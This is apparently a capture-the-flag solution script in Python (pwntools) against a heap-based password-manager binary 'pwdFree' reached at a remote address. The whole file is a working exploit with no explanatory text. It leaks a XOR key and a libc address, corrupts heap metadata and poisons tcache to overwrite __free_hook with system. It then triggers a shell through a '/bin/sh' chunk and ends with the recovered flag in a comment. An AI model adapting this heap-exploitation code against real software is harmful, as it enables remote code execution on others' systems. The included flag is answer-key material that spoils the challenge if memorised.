from pwn import *

p = remote('47.104.71.220','38562')
#p = process('./pwdFree')
elf = ELF('./pwdFree')
libc = ELF('./libc.so.6')


def Add(idx,size,con):
    p.sendlineafter('Input Your Choice:',str(1))
    p.sendlineafter('Input The ID You Want Save:',str(idx))
    p.sendlineafter('Length Of Your Pwd:',str(size))
    p.sendlineafter('Your Pwd:',con)

def Edit(idx,con):
    p.sendlineafter('Input Your Choice:',str(2))
    p.sendline(str(idx))
    p.send(con)

def Show(idx):
    p.sendlineafter('Input Your Choice:',str(3))
    p.sendlineafter('Which PwdBox You Want Check:',str(idx))

def Delete(idx):
    p.sendlineafter('Input Your Choice:',str(4))
    p.sendlineafter('Idx you want 2 Delete:',str(idx))

#context.log_level = 'debug'
Add(0,0xF8,'A'*0x10)
p.recvuntil('Save ID:')
num = u64(p.recv(8))^0x4141414141414141
print('number: '+hex(num))

for i in range(10):
    Add(i+1,0xF8,'A'*0x10)

for i in range(7):
    Delete(10-i)
Delete(0)


for i in range(7):
    Add(i+4,0xF8,'A'*0x10) #0/4-9

Delete(2)
Add(2,0xF8,b'A'*0xF0+p64(0x300^num))

for i in range(6):
    Delete(9-i)
Delete(0)
Delete(3)
for i in range(7):
    Add(i+4,0xF8,'A'*0x10) #0/3/4-8
Add(9,0xF8,'A'*0x10)
Show(1)
p.recvuntil('Pwd is: ')
libc_base = (u64(p.recv(8))^num)-0x3ebca0
p.info('libc_base: '+hex(libc_base))
Delete(0)
Delete(2)
Add(0,0x18,b'A'*0x10) #0
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+libc.sym['system']
Add(0,0x100,b'A'*0xD8+p64(0x101^num)+p64(free_hook^num)+b'A'*0x7) #2

magic = 0x0068732f6e69622f^num
Add(10,0xF8,p64(magic)+b'A'*0x8) #10
Add(11,0xF8,p64(system^num)) #11
Delete(10)

#gdb.attach(p)
p.interactive()
#flag{2db0e64f-afe1-44d4-9af9-ae138da7bb4b}